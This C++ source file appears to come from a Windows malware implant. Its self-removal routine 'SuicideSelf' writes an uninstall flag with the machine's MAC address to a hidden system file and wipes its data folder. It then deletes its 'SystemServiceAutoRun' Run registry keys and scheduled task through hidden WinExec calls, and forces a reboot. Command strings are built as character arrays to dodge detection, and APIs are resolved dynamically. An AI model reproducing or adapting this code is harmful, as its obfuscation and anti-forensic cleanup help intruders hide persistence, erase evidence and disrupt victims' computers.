
#include <string>
#include <windows.h>
#include "../api.h"
#include "../public.h"
#include "HardDiskFile.h"

#include "DeviceInfo.h"

using namespace std;

int __stdcall SuicideSelf() {

	int iret = 0;
	string fn = string(strDataPath) + PARAMS_FILENAME;
	HANDLE hf = lpCreateFileA((char*)fn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL| FILE_ATTRIBUTE_READONLY| FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM| FILE_ATTRIBUTE_ARCHIVE, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		//return FALSE;
	}

	DWORD dwcnt = 0;
	int filesize = lpGetFileSize(hf, 0);
	if (filesize && filesize == sizeof(PROGRAM_PARAMS))
	{
		PROGRAM_PARAMS params;
		iret = lpReadFile(hf, (char*)&params, filesize, &dwcnt, 0);
		params.uninstall = 1;
		iret = lpWriteFile(hf, (char*)&params, sizeof(PROGRAM_PARAMS), &dwcnt, 0);
	}
	else {
		PROGRAM_PARAMS params;
		params.uninstall = 1;
		memcpy(params.mac, cMAC, MAC_ADDRESS_LENGTH);
		iret = lpWriteFile(hf, (char*)&params, sizeof(PROGRAM_PARAMS), &dwcnt, 0);
	}

	lpCloseHandle(hf);

	int iRet = 0;
	iRet = DeleteAllFilesInDir(strDataPath);
	char szDeleteKeyFormat[] = { 'r','e','g',' ','d','e','l','e','t','e',' ',
		'%','s','\\','S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,'W','i','n','d','o','w','s',0x5c,
		'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',' ',
		'/','v',' ','%','s',' ','/','f',' ',0};

	// 		char szDeleteKeyCU[] = "reg delete HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\ /v systemserviceautorun";

	char key[] =	{ 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };

	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		char szDeleteTaskFormat[] = { 's','c','h','t','a','s','k','s',' ','/','d','e','l','e','t','e',' ','/','f',' ','/','t','n',' ','%','s',0 };
		char szDeleteTask[MAX_PATH];
		lpwsprintfA(szDeleteTask, szDeleteTaskFormat, LITTLEBEARNAME);
		iRet = lpWinExec(szDeleteTask, SW_HIDE);

		char szCuRun[MAX_PATH];
		char szCU[] = { 'h','k','c','u',0 };
		iRet = lpwsprintfA(szCuRun, szDeleteKeyFormat, szCU, key);
		iRet = lpWinExec(szCuRun, SW_HIDE);

		char szLmRun[MAX_PATH];
		char szLM[] = { 'h','k','l','m',0 };
		lpwsprintfA(szLmRun, szDeleteKeyFormat, szLM, key);
		iRet = lpWinExec(szLmRun, SW_HIDE);
	}
	else
	{
		char szCuRun[MAX_PATH];
		char szCU[] = { 'h','k','c','u',0 };
		lpwsprintfA(szCuRun, szDeleteKeyFormat, szCU);
		iRet = lpWinExec(szCuRun, SW_HIDE);

		char szLmRun[MAX_PATH];
		char szLM[] = { 'h','k','l','m',0 };
		lpwsprintfA(szLmRun, szDeleteKeyFormat, szLM);
		iRet = lpWinExec(szLmRun, SW_HIDE);
	}

	typedef DWORD(__stdcall* ptrExitWindowsEx)(DWORD, DWORD);
	char szExitWindowsEx[] = { 'E','x','i','t','W','i','n','d','o','w','s','E','x',0 };
	ptrExitWindowsEx lpExitWindowsEx = (ptrExitWindowsEx)lpGetProcAddress(lpDllUser32, szExitWindowsEx);
	iRet = lpExitWindowsEx(EWX_REBOOT, EWX_FORCE);
	iRet = lpExitProcess(0);

	return TRUE;
}